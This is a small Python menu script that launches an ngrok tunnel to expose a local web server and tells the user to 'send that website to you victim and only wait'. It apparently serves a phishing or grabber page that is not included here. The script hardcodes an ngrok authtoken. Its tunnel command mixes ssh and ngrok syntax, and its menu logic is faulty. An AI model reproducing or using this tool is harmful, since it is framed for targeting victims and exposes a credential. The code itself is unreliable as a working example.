import os 
from colorama import Fore 
import socketserver
import socket


#banner#
print (Fore.YELLOW + '  ▄█   █████████▄ ')          
print (Fore.YELLOW + '  ██   ██      ██ ')                   
print (Fore.YELLOW + '  ██   ██      ██ ')          
print (Fore.YELLOW + '  ██   ██████████ ')                      
print (Fore.YELLOW + '  ██   ██         ')                
print (Fore.YELLOW + '  ██   ██         ')                                
print (Fore.YELLOW + '  ██   ██         ')                    
print (Fore.YELLOW + '  ██   ██         ')
#menu#
def menu():
     print ('opcions')
     print ("\t1 start")
     print ("\t2 install ngrok")
while True:
    
 menu()
   
 opcionMenu = input("select a opcion >>")

 if opcionMenu=="1":
     print ("starting ngrok")
     os.system("./ngrok authtoken 1otl8ouPfwH3JwCDCD4fxu2YCgq_624ab5GeqzJhPPwHUbauT")
     os.system("./ngrok ssh -R 8080:localhost:8088 remoteUser@IPAddress")
     print("Send that website to you victim and only wait ;)")
     input("\npress enter to back")
     os.system("clear")
     
 else:
     print("A problem was ocurred, ngrok was installed?")       
     os.system("clear")

 if opcionMenu=="2":
     print ("downloading ngrok...")
     os.system("sudo tar xvzf ~/Downloads/ngrok-stable-linux-arm64.tgz -C /usr/local/bin")
     print("installed susefully!")
     input("\npress enter to back")
     os.system("clear")
 else:
     print("an error was ocurred with the installation :c")
     os.system("clear")

